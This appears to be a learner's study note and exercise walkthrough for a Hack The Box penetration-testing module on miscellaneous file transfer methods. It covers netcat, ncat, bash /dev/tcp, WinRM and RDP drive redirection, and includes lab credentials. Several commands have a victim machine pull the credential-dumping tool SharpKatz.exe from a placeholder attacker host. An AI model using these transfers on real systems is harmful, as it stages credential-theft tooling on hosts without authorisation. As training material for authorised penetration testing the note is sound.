### CPTS / HTB Penetration Tester Path <br>
### File Transfers - Miscellaneous Methods <br>
<mark>hook it up with a &#x2B50; if this helps.</mark> <br>
🐦: @<a href="https://x.com/st8less">**st8less**</a>

<br>
<br>

---

### Misc File Transfer Methods



When HTTP, SMB, FTP, and language interpreters are all unavailable, fall back to: Netcat/Ncat, PowerShell Remoting (WinRM), and RDP drive redirection.

Netcat — original `nc` is unmaintained; `ncat` (Nmap's modern reimpl) supports SSL, IPv6, SOCKS/HTTP proxies. On HTB Pwnbox, `nc` = `ncat`.

Listen on target, push from attacker (target initiates the listen — useful when firewall blocks attacker → target):

```diff
+ victim$ nc -l -p 8000 > SharpKatz.exe
+ victim$ ncat -l -p 8000 --recv-only > SharpKatz.exe
```

```diff
+ $ nc -q 0 <victim_ip> 8000 < SharpKatz.exe
+ $ ncat --send-only <victim_ip> 8000 < SharpKatz.exe
```

Reverse direction — listen on attacker, target connects (useful when firewall blocks inbound on target):

```diff
+ $ sudo nc -l -p 443 -q 0 < SharpKatz.exe
+ $ sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

```diff
+ victim$ nc <attacker_ip> 443 > SharpKatz.exe
+ victim$ ncat <attacker_ip> 443 --recv-only > SharpKatz.exe
```

No netcat on target? Bash `/dev/tcp` reads from a server-side nc:

```diff
+ victim$ cat < /dev/tcp/<attacker_ip>/443 > SharpKatz.exe
```

| Flag | Tool | Behavior |
|---|---|---|
| `-q 0` | `nc` | close connection when EOF |
| `--send-only` | `ncat` | exit after input exhausted |
| `--recv-only` | `ncat` | exit when remote closes |

PowerShell Remoting (WinRM) — uses TCP/5985 (HTTP) or TCP/5986 (HTTPS). Need admin rights, `Remote Management Users` group membership, or explicit session-config perms. Useful when HTTP/SMB are blocked but WinRM isn't.

Confirm WinRM is reachable:

```diff
+ PS> Test-NetConnection -ComputerName DATABASE01 -Port 5985
```

Open a session, push/pull files:

```diff
+ PS> $Session = New-PSSession -ComputerName DATABASE01
+ PS> Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
+ PS> Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

RDP drive redirection — mount a local Linux dir into the RDP session, then access via `\\tsclient\<name>`.

`rdesktop`:

```diff
+ $ rdesktop <ip> -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

`xfreerdp`:

```diff
+ $ xfreerdp /v:<ip> /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

The mounted drive is only visible to the RDP user — even if another user hijacks the session, they can't reach it.

<br>

---

<br>

### Misc File Transfer Exercise

IP: 10.129.199.72

---

### Question 1:
Use xfreerdp or rdesktop to connect to the target machine via RDP (Username: htb-student | Password: HTB_@cademy_stdnt!) and mount a Linux directory to practice file transfer operations (upload and download) with your attack host. Type "DONE" when finished.

#### Connect with `xfreerdp` and mount the local Desktop dir as `linux` drive:

```diff
+ $ xfreerdp /u:htb-student /p:HTB_@cademy_stdnt! /v:10.129.199.72 /d:HTB /drive:linux,/home/htb-ac-830862/Desktop/mayoasaservice
```

#### In the RDP session: Network tab → drag files between host and `\\tsclient\linux`.

&#x1F6A9; **DONE**.
